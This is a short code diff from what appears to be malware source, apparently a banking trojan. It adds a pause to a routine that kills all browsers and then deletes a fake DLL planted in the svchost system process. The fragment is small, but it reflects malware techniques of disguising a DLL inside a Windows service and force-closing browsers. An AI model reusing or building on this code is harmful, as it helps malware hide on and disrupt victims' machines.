@@ -242,6 +242,7 @@ DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
 	pSleep(10 * 1000); //ждем некоторое время
 	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
 	KillAllBrowsers();
+	pSleep(5 * 1000);
 	FakeDllDelete();
 	return 0;
 }
